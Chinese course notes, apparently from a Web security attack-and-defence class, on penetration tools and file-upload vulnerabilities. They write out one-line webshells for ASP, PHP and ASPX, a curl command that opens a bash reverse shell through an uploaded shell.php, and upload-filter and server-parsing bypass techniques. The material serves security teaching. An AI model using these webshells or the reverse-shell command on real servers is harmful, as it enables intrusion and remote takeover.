@@ -1,0 +1,200 @@
+Web 安全攻防实战
+################
+
+* 课件及 Demo: https://github.com/geektime-geekbang/WebSecurity
+
+1. 前端基础
+===========
+
+
+Web安全
+-------
+
+.. figure:: https://img.zhaoweiguo.com/uPic/2023/10/34CXjB.png
+
+	Web安全攻防要点
+
+
+
+Web渗透工具
+-----------
+
+Burp Suite
+^^^^^^^^^^
+
+* Burp Suite是用于攻击Web应用程序的集成平台框架。 它包含了许多Web安全相关工具， 也同时设计了接口，满足了安全人员自行拓展程序功能的需求。
+* Burp Suite 插件: https://portswigger.net/burp
+
+* Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。
+* Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。
+* Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。
+* Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。
+* Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。
+* Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。
+
+
+HackBar
+^^^^^^^
+
+* 浏览器插件，包含一些常用的工具。(SQL injection,XSS,加密等)，可以利用它，快速构建一个HTTP请求，或者用它快速实现某种算法等，多用于手工测试Web漏洞。
+
+
+Wappalyzer
+^^^^^^^^^^
+
+* 是一款功能强大的、且非常实用的网站技术分析插件，通过该插件能够分析目标网站所采用的平台构架、网站环境、服务器配置环境、JavaScript框架、编程语言等参数。
+* https://www.wappalyzer.com/
+
+
+2. Web安全之后端安全
+====================
+
+文件上传漏洞
+------------
+
+一句话木马
+^^^^^^^^^^
+
+::
+
+	asp:
+	<%execute(request("value"))%>
+
+	php:
+	<?php @eval($_POST[“value”]);?>
+
+	aspx:
+	<%@ Page Language="Jscript"%>
+	<%eval(Request.Item["value"])%>
+
+	其他:
+	<%eval request("value")%>
+	<%execute request("value")%>
+	<%execute(request("value"))%>
+
+
+
+* Webshell 集成环境 - 中国菜刀: https://github.com/raddyfiy/caidao-official-version
+* 示例：反向shell: curl --data-urlencode "hacker=shell_exec(\"/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.13/8888 0>&1 ' \");" http://127.0.0.1/images/shell.php
+
+后缀名绕过
+^^^^^^^^^^
+
+* 上面的操作都需要文件可以上传，比如，若上传数据器禁止了后缀为.php文件的上传，这时就需要使用后缀名绕过方法
+* 把上传文件名改为.php3，再上传此文件
+* 之所以改后缀名能绕过是因为Apache或nginx+php-fpm配置了.php3文件也匹配php逻辑，如
+* <FilesMatch ".+ph(p[345]?|t|tml)$">
+
+
+
+
+服务器关联型漏洞
+^^^^^^^^^^^^^^^^
+
+* Exploit Database 官方网址: https://www.exploit-db.com/
+
+IIS 5.x / 6.0 解析漏洞::
+
+	漏洞1：当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件
+	漏洞2：服务器默认不解析“;”以后的内容
+	漏洞利用形式：
+	漏洞1：www.xxx.com/xx.asp/xx.jpg 会被解析成asp文件
+	漏洞2：www.xxx.com/xx.asp;.jpg 会被解析成为asp文件
+
+Nginx 解析漏洞::
+
+	在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。
+	PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，
+	默认是开启的。
+	当URL中有不存在的文件时，PHP就会默认向前解析。
+	漏洞利用流程：
+	1. 访问：www.xx.com/phpinfo.jpg/1.php （1.php不存在）
+	2. 会解析phpinfo.jpg文件，但是按照php格式解析
+
+
+Apache 解析漏洞::
+
+	Apache 在1.x和2.x版本中存在解析漏洞：
+	Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，
+	然后将该可识别后缀进解析。
+	漏洞利用流程：
+	1. 上传shell.php.test；
+	2. 访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。
+
+
+其他绕过类型
+^^^^^^^^^^^^
+
+* 前端验证绕过:
+	1. 通过Burp Suite抓包，然后修改内容后放行。
+	2. 通过Chrome禁止/删除JavaScript代码。
+
+* .htaccess绕过
+	1. 上传一个.htaccess文件，文件内容设置为【AddType application/x-httpd-php .test】。
+	2. 上传一句话木马文件，文件名设置为shell.test。
+	3. 在浏览器中访问shell.test即可执行一句话木马。
+
+* 大小写绕过
+* Windows 文件流特性绕过：NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。
+* %00截断绕过
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
